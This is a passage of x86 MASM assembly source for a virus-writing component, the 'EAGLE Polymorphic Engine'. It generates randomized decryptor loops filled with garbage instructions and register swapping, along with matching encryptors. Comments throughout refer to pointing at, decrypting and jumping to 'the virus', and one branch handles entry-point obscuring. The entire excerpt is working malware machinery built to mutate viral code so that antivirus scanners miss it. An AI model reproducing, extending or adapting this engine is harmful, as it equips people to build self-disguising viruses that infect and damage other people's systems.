            Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
            Mov dEip,Eax
            Mov Eax,[Edi+70+1*4].RWPolyData.GarManglo
            Mov nIns,Eax
            Movzx Eax,[Edi+3].RWPolyData.UsedRegs
            Mov RegTable,Eax
            Dec RegTable
            Movzx Eax,[Edi+2].RWPolyData.UsedRegs
            Mov RegKey,Eax
            Dec RegKey
            Invoke Assembl, ASM_POP,dEip,Byte Ptr [RegTable],0,ONLY_REG,0,0
            Mov dEip,Edi
            Mov Edi,HeapPtr
            Mov Edx,1
            Mov Ecx,RegTable
            Shl Edx,Cl          ;we now initialized this register so we need to put it in AffectedRegs
            Or [Edi].RWPolyData.AffectedRegs,Dl ;that's for avoid the garbage from using it
            Mov Ebx,Flags
            Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
            Mov dEip,Eax
        .EndIf
        Invoke Assembl, ASM_MOV,enEip,REG_EBX,REG_ECX,R_RM,EncryptTable,0
        Mov enEip,Edi
    .EndIf
;------------------------------------------------------------------------;
        ;=*-=*-=*-=*-=*-= XOR INSTRUCTION =*-=*-=*-=*-=*-=;
        Mov Temp1,0
        Mov Temp3,0
    .If Alg<3
        Invoke Rand, 0
        Mov Temp2,Eax
    .Else
        .If Alg==5
            Invoke Rand, 0
            Mov Temp2,Eax
            Sub Alg,3
        .EndIf
        Mov Temp2,0
        Sub Alg,3
    .EndIf
    .If Alg==0          ;Xor
        Mov Temp1,ASM_XOR
        Mov Temp3,ASM_XOR
    .ElseIf Alg==1      ;Add/Sub
        Invoke Rand, 2
        .If Eax==0
            Mov Temp1,ASM_ADD
            Mov Temp3,ASM_SUB   ;for the encryption
        .Else
            Mov Temp1,ASM_SUB
            Mov Temp3,ASM_ADD
        .EndIf
    .Else               ;ROR/ROL
        Invoke Rand, 2
        .If Eax==0
            Mov Temp1,ASM_ROR
            Mov Temp3,ASM_ROL   ;for the encryption
        .Else
            Mov Temp1,ASM_ROL
            Mov Temp3,ASM_ROR
        .EndIf
    .EndIf
    .If !(Temp2==0)         ;with key
        .If Alg==2
            And Temp2,1FH
            .If Temp2==0
                Inc Temp2
            .EndIf
        .EndIf
        Mov Edi,HeapPtr
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Invoke Assembl, Temp1,dEip,Byte Ptr [RegKey],0,R_IMM,0,Temp2
        Mov dEip,Edi
    .Else                   ;with table
        Mov Edi,HeapPtr
        Movzx Eax,[Edi+3].RWPolyData.UsedRegs
        Mov RegTable,Eax
        Dec RegTable
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Invoke Assembl, Temp1,dEip,Byte Ptr [RegKey],Byte Ptr [RegTable],R_RM Or RM_REG,0,0
        Mov dEip,Edi
    .EndIf
    Mov Edi,HeapPtr
    Mov Eax,[Edi+50+2*4].RWPolyData.GarManglo
    Mov nIns,Eax                                        ;we get the number of garbage instructions
    .If (Temp2==0)          ;with key
        Mov Edx,1
        Mov Ecx,RegTable
        Shl Edx,Cl          ;we now free this register so we need to remove it from AffectedRegs
        Not Edx
        And [Edi].RWPolyData.AffectedRegs,Dl    ;that's for making it avariable for the garbage
    .EndIf
    Mov Ebx,Flags
    Invoke GarPJ, nIns,dEip,HeapPtr,Ebx         ;let's do it
    Mov dEip,Eax
    .If !(Temp2==0)         ;with key
        .If Alg==2
            And Temp2,1FH
        .EndIf
        Invoke Assembl, Temp3,enEip,REG_EAX,0,R_IMM,0,Temp2
        Mov enEip,Edi
    .Else                   ;wth table
        Invoke Assembl, Temp3,enEip,REG_EAX,REG_EBX,R_RM Or RM_REG,0,0
        Mov enEip,Edi
    .EndIf
;------------------------------------------------------------------------;
        ;=*-=*-=*-=*-=*-= WRITE INSTRUCTION =*-=*-=*-=*-=*-=;
BeginWrite:
    Mov Edi,HeapPtr
    .If [Edi+1].RWPolyData.UsedRegs ==0     ;Is there a register pointing to the virus or not?
        Invoke Rand, 2                      ;not so we will have two type of instuctions for read
    .Else
        Invoke Rand, 4                      ;yes there's .So we have 4
    .EndIf
    .If Eax==0      ;instruction like Mov eax,dword[virusPtr+ecx]
        Mov Edi,HeapPtr
        Mov Eax,[Edi+50+3*4].RWPolyData.GarManglo
        Mov nIns,Eax                                        ;we get the number of garbage instructions
        Push Edi
        Mov Dl,[Edi].RWPolyData.UsedRegs
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Invoke Assembl, ASM_MOV,dEip,Byte Ptr [RegKey],Dl,RM_R,[Edi].RWPolyData.VirusPtr,0
        Mov dEip,Edi
        ;for the encryptor
        Pop Edi
        Mov Edx,1
        Mov Ecx,RegKey
        Shl Edx,Cl
        Not Edx
        And [Edi].RWPolyData.AffectedRegs,Dl
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
    .ElseIf Eax==1  ;instruction like push dword[virusPtr+ecx]/pop eax
        Mov Edi,HeapPtr
        Mov Eax,[Edi+50+3*4].RWPolyData.GarManglo
        Dec Eax                                         ;because we will write a new instruction pop e?X
        .If Al==0FFH                                ;mean minus (it mean a plus instruction so return to get another)
            Jmp BeginWrite
        .EndIf
        Lea Esi,[Edi+70].RWPolyData.GarManglo
        Invoke Manglo,Esi,2,Eax,50                          ;in this instruction we will use 2 GarbJ after the push and after the pop so we need to call manglo for that
        Mov Eax,[Edi+70].RWPolyData.GarManglo
        Mov nIns,Eax
        Push Edi
        Mov Dl,[Edi].RWPolyData.UsedRegs
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        ;PUSH EAX
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Invoke Assembl, ASM_PUSH,dEip,Byte Ptr [RegKey],0,ONLY_REG,0,0
        Mov dEip,Edi
        Pop Edi
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
        Mov Dl,[Edi].RWPolyData.UsedRegs
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        Mov Eax,[Edi+70+1*4].RWPolyData.GarManglo
        Mov nIns,Eax
        ;POP DWORD PTR [ECX+0040XXXX]
        Invoke Assembl, ASM_POP,dEip,0,Dl, ONLY_RM,[Edi].RWPolyData.VirusPtr,0
        Mov dEip,Edi
        Mov Edi,HeapPtr
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Mov Edx,1
        Mov Ecx,RegKey
        Shl Edx,Cl
        Not Edx
        And [Edi].RWPolyData.AffectedRegs,Dl    ;that's for avoid the garbage from using it
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
    .ElseIf Eax==2      ;instruction like Mov eax,dword[edi]
        Mov Edi,HeapPtr
        Mov Eax,[Edi+50+3*4].RWPolyData.GarManglo
        Mov nIns,Eax                                        ;we get the number of garbage instructions
        Push Edi
        Mov Dl,[Edi+1].RWPolyData.UsedRegs
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Invoke Assembl, ASM_MOV,dEip,Byte Ptr [RegKey],Dl,RM_R,0,0
        Mov dEip,Edi
        ;for the encryptor
        Pop Edi
        Mov Edx,1
        Mov Ecx,RegKey
        Shl Edx,Cl
        Not Edx
        And [Edi].RWPolyData.AffectedRegs,Dl    ;that's for avoid the garbage from using it
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
    .ElseIf Eax==3  ;instruction like push dword[edi]/pop eax
        Mov Edi,HeapPtr
        Mov Eax,[Edi+50+3*4].RWPolyData.GarManglo
        Dec Eax                                         ;because we will write a new instruction pop e?X
        .If Al==0FFH                                ;mean minus (it mean a plus instruction so return to get another)
            Jmp BeginWrite
        .EndIf
        Lea Esi,[Edi+60].RWPolyData.GarManglo
        Invoke Manglo,Esi,2,Eax,50                          ;in this instruction we will use 2 GarbJ after the push and after the pop so we need to call manglo for that
        Mov Eax,[Edi+60].RWPolyData.GarManglo
        Mov nIns,Eax
        Push Edi
        Mov Dl,[Edi+1].RWPolyData.UsedRegs                  ;the Register that used as a pointer to the virus
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        ;PUSH DWORD PTR [edi]
        Invoke Assembl, ASM_PUSH,dEip,Byte Ptr [RegKey],0,ONLY_REG,0,0
        Mov dEip,Edi
        Pop Edi
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
        Mov Dl,[Edi+1].RWPolyData.UsedRegs
        Dec Edx                                             ;as 0 not mean eax but mean no register (1-->eax 2-->ecx and so on)
        Mov Eax,[Edi+70+1*4].RWPolyData.GarManglo
        Mov nIns,Eax
        Invoke Assembl, ASM_POP,dEip,0,Dl, ONLY_RM,0,0
        Mov dEip,Edi
        Mov Edi,HeapPtr
        Movzx Eax,[Edi+2].RWPolyData.UsedRegs
        Mov RegKey,Eax
        Dec RegKey
        Mov Edx,1
        Mov Ecx,RegKey
        Shl Edx,Cl
        Not Edx
        And [Edi].RWPolyData.AffectedRegs,Dl    ;that's for avoid the garbage from using it
        Mov Ebx,Flags
        Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
        Mov dEip,Eax
    .EndIf
    ;pop eax
    Invoke Assembl, ASM_MOV,enEip,REG_EAX,REG_ECX,RM_R,[Edi].RWPolyData.VirusOffset,0
    Mov enEip,Edi
    Mov Edi,HeapPtr
    Lea Edi,[Edi].RWPolyData.EncryptorTemp
    Sub enEip,Edi
    Mov Eax,enEip           ;return value
    Mov Edi,dEip            ;dEip return (very important)
    Ret
CreateAlgorithm EndP
;this Proc take the maximum number of garbage instructions should be placed between the Algorithm instructions
;this Proc gives a random number of garbage instructions should be placed between 2 Algorithm instruction
;with one condition :the sum of all these numbers are equal to the maximum number of garbage instructions
;Like:
;     1 2 5 2 =10
;     4 3 2 1 =10
;     6 1 1 2 =10
; and so on
; these numbers present the number of garbage instructions between two Algorithm instruction
; each number will be placed in a byte in BufferPtr (TAKE CARE OG THAT)
Manglo Proc Uses Edi Esi Edx Ecx BufferPtr:DWord,DecryptorIns:DWord,GarbageIns:DWord,nLoops:DWord
    Local Temp1:DWord
    Local Temp2:DWord

    Mov Eax,GarbageIns
    Mov Ecx,DecryptorIns
    Xor Edx,Edx                 ;important for divide
    Div Ecx                     ;we now have the initial value of all numbers
    Mov Temp1,Eax
    Mov Temp2,Edx               ;will be added to the last byte
    ;Let's make a loop to put the initial value in all bytes of BufferPtr
    Mov Ecx,DecryptorIns
    ;Inc Ecx
    Mov Edi,BufferPtr
    .While Ecx>0
        Mov DWord Ptr [Edi],Eax
        Add Edi,4
        Dec Ecx
    .EndW
    ; we reach the last byte
    Sub Edi,4
    Add DWord Ptr [Edi],Edx
    ;Let's begin the manglo
    ; we will take a random byte and subtract from it 1
    ; after that we will take a random byte and add to it 1
    ;so the sum is the same but M.A.N.G.L.O
    Mov Ecx,DecryptorIns
    Mov Edi,BufferPtr
    Mov Edx,nLoops          ;the number of loops
    .While Edx>0
        Invoke Rand, Ecx
        Shl Eax,2
        Mov Esi,Edi
        Add Esi,Eax
        .If !(DWord Ptr [Esi]==1) && !(DWord Ptr [Esi]==0)
            Dec DWord Ptr [Esi]
            Invoke Rand, Ecx
            Shl Eax,2           ;*4
            Mov Esi,Edi
            Add Esi,Eax
            Inc DWord Ptr [Esi]
        .EndIf
        Dec Edx
    .EndW
    Ret
Manglo EndP
PutInTheEncryptor Proc Uses Esi Edi Ecx Edx HeapPtr:DWord,destBuffer:DWord,srcBuffer:DWord,nSize:DWord
    Local Temp1:DWord
    Local Temp2:DWord
    Local ReturnValue:DWord
    Mov Edi,HeapPtr
    Mov Eax,destBuffer                      ;we will get the differences between the beginnig and the end in the encryptor
    Sub Eax,[Edi].RWPolyData.EncryptorPtr   ;eax-->difference between the beginning and the end
    Neg Eax
    Mov Temp1,Eax                           ;save it
    Mov Esi,nSize
    Mov Edi,destBuffer
    Add Esi,Edi
    Xchg Esi,Edi
    Mov Ecx,Temp1
    ;we will now mov the data into a new location
    ;esi-->old location
    ;edi-->new location
    ;ecx-->the size of the data that will be moved
    ;we will move them down up for preventing any data loss
    ;Let's begin
    Dec Ecx
    Add Esi,Ecx
    Add Edi,Ecx
    Mov ReturnValue,Edi
    Inc ReturnValue
    Inc Ecx
    ;now esi,edi pointing to the end let's begin the loop
    .While Ecx>0
        Mov Al,Byte Ptr [Esi]
        Mov Byte Ptr [Edi],Al
        Dec Esi
        Dec Edi
        Dec Ecx
    .EndW
    Inc Esi
    Inc Edi
    ;now we will put in the buffer in the space we create
    Mov Edi,srcBuffer
    Mov Ecx,nSize
    Xchg Esi,Edi
    Rep Movsb
    Mov Eax,ReturnValue
    Ret
PutInTheEncryptor EndP
;------------------------------------------------------------------------------------------
;Keyword:Eagle_Place
     ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
     ;-=-=-=                    EAGLE Polymorhic Engine                          =-=-=-
     ;-=-=-=                                                                     =-=-=-
     ;-=-=-=                                                                     =-=-=-
     ;-=-=-=    Return:                                                          =-=-=-
     ;-=-=-=        eax-->Pointer to the end of the created Garbage              =-=-=-
     ;-=-=-=                                                                     =-=-=-
     ;-=-=-=                                                                     =-=-=-
     ;-=-=-=                                                                     =-=-=-
     ;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Eagle Proc Uses Ebx Ecx Edx Esi Edi HeapPtr:DWord,DecryptorSize:DWord,AlgorithmsCount:DWord,VirusPointer:DWord
    Local IsPointer:DWord           ;that's for pointer initialization mov edi,VirusRVA
    Local PointerCount:DWord
    Local MaxGarIns:DWord
    Local MinGarIns:DWord
    Local AlgsCount:DWord
    Local dEip:DWord
    Local enEip:DWord
    Local LocalVars:DWord
    Local GarIndex:DWord
    Local nIns:DWord
    Local Temp1:DWord
    Local Temp2:DWord
    Local Temp3:DWord
    Local JmpPtr:DWord
    Local AlgsPlace:DWord
    Local enJmpPtr:DWord
    Local RegCounter:Byte
    Local RegPointer:Byte
    Local initRegs:Byte
;-----------------------------------------------------------------------------------------------
                ;=*-=*-=*-=*-=*-= PREPARATION =*-=*-=*-=*-=*-=;
    Mov GarIndex,0          ;will be discribed later
    Invoke Rand,2
    Mov IsPointer,Eax       ;will we initialize a pointer for the virus or not? like mov edi,VirusRVA
    Invoke Rand,2
    Inc Eax
    Mov PointerCount,Eax    ;how many instructions we will use to initialize edi like mov edi,X1/add edi,X2 -->X1+X2==VirusRVA
    ;we wil devide the Size with 4.5 . to do that we will multiply the size by 2 and then divide it by 9

    .If DecryptorSize<500       ;under 500 we will make it 6 for safety
        Mov Eax,DecryptorSize
        Xor Edx,Edx
        Mov Ecx,2
        Mul Ecx
        Mov Ecx,13              ;SizeOfInstruction==6.5
        Div Ecx
        Mov MinGarIns,Eax
    .ElseIf DecryptorSize<2000          ;4.5 only for bigger than 2000 but if under for safety make it 5
        Mov Eax,DecryptorSize
        Xor Edx,Edx
        Mov Ecx,5               ; SizeOfInstruction==5
        Div Ecx
        Mov MinGarIns,Eax
    .Else
        Mov Eax,DecryptorSize
        Xor Edx,Edx
        Mov Ecx,2
        Mul Ecx
        Mov Ecx,9               ;SizeOfInstruction==4.5
        Div Ecx
        Mov MinGarIns,Eax
    .EndIf
    Mov Eax,DecryptorSize
    Xor Edx,Edx
    Mov Ecx,4               ;CodeSize/SizeOfInstruction==NumberOfInstructions (we set here the SizeOfInstruction==4 -not the smallest but near the true-)
    Div Ecx
    Mov MaxGarIns,Eax
    .If AlgorithmsCount==0  ;this parameter is Optional if you don't need a specific number of Algorithms set it 0
        Invoke Rand, 4
        Inc Eax
        Mov Ecx,Eax         ;randomly take a number from 1-->4
    .Else
        Mov Ecx,AlgorithmsCount ;take the number he need
    .EndIf
    Mov AlgsCount,Ecx           ;save it
    ;now we have ecx-->number of Algorithms . we will add to it somethings to get the number of places we need for garbage instructions)
    ;we have the MinGarCount-->the number of all garbage insatructions we will divide it on every place in the decryptor and use our manglo for that
    Add Ecx,4 ;push ebp .. and the jmp to the virus and init the counter
    Sub MaxGarIns,6
    .If IsPointer==1    ;for the pointer also
        Inc Ecx
        Mov Eax,PointerCount
        Sub MaxGarIns,Eax
    .EndIf
    .If !(VirusPointer==0)
        Inc Ecx
    .EndIf
    Mov Edi,HeapPtr
    Lea Edx,[Edi].RWPolyData.GarManglo
    Invoke Manglo, Edx,Ecx,MinGarIns,1000
    Lea Eax,[Edi].RWPolyData.Decryptor
    Mov dEip,Eax
    Lea Eax,[Edi].RWPolyData.Encryptor
    Mov enEip,Eax

;-----------------------------------------------------------------------------------------------
        ;=*-=*-=*-=*-=*-= FUNCTION PROLOGUE INSTRUCTIONS =*-=*-=*-=*-=*-=;
    ;push ebp
    Invoke Assembl, ASM_PUSH,dEip,REG_EBP,0,ONLY_REG,0,0
    Mov dEip,Edi
    ;mov ebp,esp
    Invoke Assembl, ASM_MOV,dEip,REG_EBP,REG_ESP,R_RM Or RM_REG,0,0
    Mov dEip,Edi
    ;that's for searching for the the procedure
    IFDEF _DEBUG_MODE_2_
        Invoke Assembl, ASM_NOP,dEip,0,0,0,0,0
        Mov dEip,Edi
        Invoke Assembl, ASM_NOP,dEip,0,0,0,0,0
        Mov dEip,Edi
        Invoke Assembl, ASM_NOP,dEip,0,0,0,0,0
        Mov dEip,Edi
    ENDIF
    ;the same for the encryptor
    Invoke Assembl, ASM_PUSH,enEip,REG_EBP,0,ONLY_REG,0,0
    Mov enEip,Edi
    Invoke Assembl, ASM_MOV,enEip,REG_EBP,REG_ESP,R_RM Or RM_REG,0,0
    Mov enEip,Edi
    Invoke Rand, 8      ;for local variables
    Add Eax,3           ;from 3-->11
    Mov Edi,HeapPtr
    Mov [Edi].RWPolyData.nLocalVars,Al  ;save it
    Shl Eax,2           ;*4
    Mov Temp1,Eax       ;save it temporary
    ;sub esp,XX         ;no need for the encryptor to include this instruction
    Invoke Assembl, ASM_SUB,dEip,REG_ESP,0,R_IMM,0,Temp1
    Mov dEip,Edi
    Mov Edi,HeapPtr
    Lea Eax,[Edi].RWPolyData.GarManglo
    Mov Ecx,GarIndex    ;because we divide the number of garbage instructions for every decryptor instruction so GarIndex mean what nIns we will take
    Add Eax,Ecx
    add GarIndex,4
    Mov Eax,DWord Ptr [Eax]
    Mov nIns,Eax
    Invoke Rand, nIns
    Sub nIns,Eax
    Mov Edi,HeapPtr
    Mov [Edi].RWPolyData.AffectedRegs,0CEH  ;reserve all except eax **
    Mov Ebx,NO_REGRESERVE
    Or Ebx,NO_REGSWAPPING
    Invoke GarPJ, nIns,dEip,HeapPtr,Ebx
    Mov dEip,Eax
    .If !([Edi].RWPolyData.EpoPointer==0)
        Invoke Assembl, ASM_PUSHAD,dEip,0,0,0,0,0
        Mov dEip,Edi
    .EndIf
    Mov Edi,HeapPtr
    Mov [Edi].RWPolyData.AffectedRegs,0 ;return to the initial state
    Invoke GarPJ, nIns,dEip,HeapPtr,NO_REGSWAPPING      ;if there's a regswapping here it will create infinite loop
    Mov dEip,Eax
;-----------------------------------------------------------------------------------------------
        ;=*-=*-=*-=*-=*-= INITIALIZATION INSTRUCTIONS =*-=*-=*-=*-=*-=;
    Invoke GetValidReg, 0       ;no register untill now
    Mov Temp1,Eax
    Mov Edi,HeapPtr
    Mov Edx,1
    Mov Ecx,Eax
    Shl Edx,Cl
    Or [Edi].RWPolyData.AffectedRegs,Dl     ;reserve the register
    Inc Eax
    Mov [Edi].RWPolyData.UsedRegs,Al        ;save it as the counter
    Invoke Assembl, ASM_XOR,dEip,Byte Ptr [Temp1],Byte Ptr [Temp1],RM_REG Or R_RM,0,0
    Mov dEip,Edi
    Invoke Assembl, ASM_XOR,enEip,REG_ECX,REG_ECX,RM_REG Or R_RM,0,0
    Mov enEip,Edi
    Mov Edi,HeapPtr
    Lea Eax,[Edi].RWPolyData.GarManglo
    Mov Ecx,GarIndex                    ;now it==1 pointing to the next entry in GarManglo and that's we need
    Add Eax,Ecx
    Add GarIndex,4
    Mov Eax,DWord Ptr [Eax]
    Mov nIns,Eax
    Invoke GarPJ, nIns,dEip,HeapPtr,0       ;regswapping is OK right now
    Mov dEip,Eax
    Mov JmpPtr,Eax          ;that's if there's not IsPointer
    .If IsPointer
        Mov Edi,HeapPtr
        Invoke GetValidReg, [Edi].RWPolyData.AffectedRegs
        Mov Temp1,Eax
        Mov Edx,1
        Mov Ecx,Eax
        Shl Edx,Cl
        Or [Edi].RWPolyData.AffectedRegs,Dl     ;reserve the register
        Inc Eax
        Mov [Edi+1].RWPolyData.UsedRegs,Al      ;save it as the pointer
        Mov Ecx,PointerCount
        Dec Ecx                                 ;the first instruction
        .If Ecx==0
            Invoke Rand, 2
            Mov Edi,HeapPtr
            .If Eax==0
                ;Mov edi,VirusRVA
                Invoke Assembl, ASM_MOV,dEip,Byte Ptr [Temp1],0,R_IMM,0,[Edi].RWPolyData.VirusPtr
            .Else
                ;Lea edi,[VirusRVA]
                Invoke Assembl, ASM_LEA,dEip,Byte Ptr [Temp1],0,R_RM Or RM_NOREG,[Edi].RWPolyData.VirusPtr,0
            .EndIf
            Mov dEip,Edi
            Mov Edi,HeapPtr
            Lea Eax,[Edi].RWPolyData.GarManglo
            Mov Ecx,GarIndex
            Add Eax,Ecx
            Add GarIndex,4
            Mov Eax,DWord Ptr [Eax]
            Mov nIns,Eax
        .Else
            Invoke Rand, 0
            Mov Temp2,Eax
            Invoke Rand, 2
            Mov Edi,HeapPtr
            .If Eax==0  ;*LEA/MOV
                ;Mov edi,XXXXXXXXH
                Invoke Assembl, ASM_MOV,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
            .Else
                ;Lea edi,[XXXXXXXXH]
                Invoke Assembl, ASM_LEA,dEip,Byte Ptr [Temp1],0,R_RM Or RM_NOREG,Temp2,0
            .EndIf
            Mov dEip,Edi
            Mov Edi,HeapPtr
            Lea Eax,[Edi].RWPolyData.GarManglo
            Mov Ecx,GarIndex
            Add Eax,Ecx
            Add GarIndex,4
            Mov Eax,DWord Ptr [Eax]
            Mov nIns,Eax
            .If !(nIns==0)
                Invoke Rand, nIns               ;without use Manglo we can do that (more easier)
            .Else
                Xor Eax,Eax                     ;make it 0 (for safty)
            .EndIf
            Sub nIns,Eax
            Mov Edx,Eax
            Invoke GarPJ, Edx,dEip,HeapPtr,0
            Mov dEip,Eax
            Movzx Eax,[Edi+1].RWPolyData.UsedRegs
            Mov Temp1,Eax                       ;maybe it swapped
            Dec Temp1
            Mov Eax,Temp2
            Invoke Rand, 3
            Mov Edi,HeapPtr
            .If Eax==0  ;Add/ Sub/ Xor
                ;add edi,XXXXXXXX
                Mov Eax,[Edi].RWPolyData.VirusPtr
                Sub Eax,Temp2                   ;calculating the difference
                Mov Temp2,Eax
                Invoke Assembl, ASM_ADD,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
                Mov dEip,Edi
            .ElseIf Eax==1
                ;sub edi,XXXXXXXX
                Mov Eax,[Edi].RWPolyData.VirusPtr
                Sub Eax,Temp2
                Neg Eax
                Mov Temp2,Eax
                Invoke Assembl, ASM_SUB,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
                Mov dEip,Edi
            .Else
                ;Xor edi,XXXXXXXX
                Mov Eax,[Edi].RWPolyData.VirusPtr
                Xor Eax,Temp2
                Mov Temp2,Eax
                Invoke Assembl, ASM_XOR,dEip,Byte Ptr [Temp1],0,R_IMM,0,Temp2
                Mov dEip,Edi
            .EndIf
        .EndIf
        Mov Edi,HeapPtr
        Invoke Assembl, ASM_MOV,enEip,REG_EDI,0,R_IMM,0,[Edi].RWPolyData.VirusOffset
        Mov enEip,Edi
    .EndIf
    .If !(nIns==0)              ;if it ==0 the rand will return infinite number
        Invoke Rand, nIns       ;take a part from it
    .Else
        Xor Eax,Eax             ;make it 0
    .EndIf
    Mov Edx,Eax
    Sub nIns,Edx
    Invoke GarPJ,Edx,dEip,HeapPtr,0
    Mov dEip,Eax
    Mov JmpPtr,Eax      ;save it as
    Mov Edi,HeapPtr
    Mov Al,[Edi].RWPolyData.UsedRegs
    Mov RegCounter,Al
    Mov Al,[Edi+1].RWPolyData.UsedRegs
    Mov RegPointer,Al
    Mov Al,[Edi].RWPolyData.AffectedRegs
    Mov initRegs,Al
    Invoke GarPJ,nIns,dEip,HeapPtr,0    ;the remaining instructions
    Mov dEip,Eax
    
;-----------------------------------------------------------------------------------------------
                ;=*-=*-=*-=*-=*-= Algorithm INSTRUCTIONS =*-=*-=*-=*-=*-=;
    ;here we need to save the registers (counter and pointer) to swapping the registers before jmp
    Mov Eax,enEip
    Mov AlgsPlace,Eax       ;save it here because it's the place where we will put the Algorithms
    Mov enJmpPtr,Eax        ;that's the place where the jmp in the encryptor will refer to
    .While AlgsCount>0
        Invoke Rand,3
        Mov Edx,Eax     ;the type of the Algorithm (Xor/Add/Rol)
        Mov Edi,HeapPtr
        Lea Eax,[Edi].RWPolyData.GarManglo
        Mov Ecx,GarIndex
        Add Eax,Ecx
        Add GarIndex,4
        Mov Eax,DWord Ptr [Eax]
        Mov nIns,Eax
        Mov Eax,enEip
        Mov [Edi].RWPolyData.EncryptorPtr,Eax       ;save it for the PutInTheEncryptor
        Invoke CreateAlgorithm,HeapPtr,Edx,dEip,nIns,0
        Mov dEip,Edi
        Mov Edx,Eax     ;size of encryptor created by this Algorithm
        Mov Edi,HeapPtr
        Mov [Edi+2].RWPolyData.UsedRegs,0
        Mov [Edi+3].RWPolyData.UsedRegs,0
        Lea Edi,[Edi].RWPolyData.EncryptorTemp  ;the place of the encryptor created by CreateAlgorithm
        Invoke PutInTheEncryptor, HeapPtr,AlgsPlace,Edi,Edx
        Mov enEip,Eax                       ;save it
        Dec AlgsCount                       ;the next Algorithm
    .EndW
;-----------------------------------------------------------------------------------------------
                ;=*-=*-=*-=*-=*-= INCREMENT INSTRUCTIONS =*-=*-=*-=*-=*-=;
    ;we need here to write add ecx,4 and add edi,4 ... we will create it by add 4 or sub -4
    Mov Edi,HeapPtr
    Lea Eax,[Edi].RWPolyData.GarManglo
    Mov Ecx,GarIndex
    Add Eax,Ecx
    Add GarIndex,4
    Mov Eax,DWord Ptr [Eax]
    Mov nIns,Eax
    Movzx Edx,[Edi].RWPolyData.UsedRegs
    Dec Edx
    Invoke Rand,2
    .If Eax==0
        ;Add ecx,4
        Invoke Assembl, ASM_ADD,dEip,Dl,0,R_IMM,0,4
    .Else
        ;sub ecx,(FF-3)h        calculate it :)
        Invoke Assembl, ASM_SUB,dEip,Dl,0,R_IMM,0,0FFH-3
    .EndIf
    Mov dEip,Edi
    Invoke Rand,nIns        ;more easier than manglo
    .If nIns==0
        Xor Eax,Eax         ;very important
    .EndIf
    Sub nIns,Eax
    Invoke GarPJ, Eax,dEip,HeapPtr,0
    Mov dEip,Eax
    ;for the encryptor
    Invoke Assembl, ASM_ADD,enEip,REG_ECX,0,R_IMM,0,4
    Mov enEip,Edi
    .If IsPointer==1
        Mov Edi,HeapPtr
        Movzx Edx,[Edi+1].RWPolyData.UsedRegs
        Dec Edx
        Invoke Rand,2
        .If Eax==0
            ;Add ecx,4
            Invoke Assembl, ASM_ADD,dEip,Dl,0,R_IMM,0,4
        .Else
            ;sub ecx,(FF-3)h        calculate it :)
            Invoke Assembl, ASM_SUB,dEip,Dl,0,R_IMM,0,0FFH-3
        .EndIf
        Mov dEip,Edi
        Invoke Rand,nIns        ;more easier than manglo
        .If nIns==0
            Xor Eax,Eax         ;very important
        .EndIf
        Sub nIns,Eax
        Invoke GarPJ, Eax,dEip,HeapPtr,0
        Mov dEip,Eax
        ;for the encryptor
        Invoke Assembl, ASM_ADD,enEip,REG_EDI,0,R_IMM,0,4
        Mov enEip,Edi
    .EndIf
    Invoke GarPJ, nIns,dEip,HeapPtr,0       ;the remaining of nIns
    Mov dEip,Eax
;-----------------------------------------------------------------------------------------------
                ;=*-=*-=*-=*-=*-= LOOP JUMP INSTRUCTIONS =*-=*-=*-=*-=*-=;
    ;now let's begin the regswapping to return the counter and the pointer to it's initial state
    ;to do that we should be sure that the initial register of the counter is the current register of the pointer
    Mov Edi,HeapPtr
    Lea Eax,[Edi].RWPolyData.GarManglo
    Mov Ecx,GarIndex
    Add Eax,Ecx
    Add GarIndex,4
    Mov Eax,DWord Ptr [Eax]
    Mov nIns,Eax
    Mov Al,initRegs
    Or [Edi].RWPolyData.AffectedRegs,Al         ;reserve also the initial counter and pointer
    Movzx Edx,[Edi+1].RWPolyData.UsedRegs
    .If Dl==RegCounter                                      ;test if there's the init counter == to the current pointer
        Invoke GetValidReg,[Edi].RWPolyData.AffectedRegs    ;yes ,there is so mov the pointer to any regster right now to free the initial counter
        Mov Temp1,Eax
        Mov Ecx,Eax
        Mov Edx,1
        Shl Edx,Cl
        Or [Edi].RWPolyData.AffectedRegs,Dl                 ;reserve this register
        Movzx Edx,[Edi+1].RWPolyData.UsedRegs
        Dec Edx
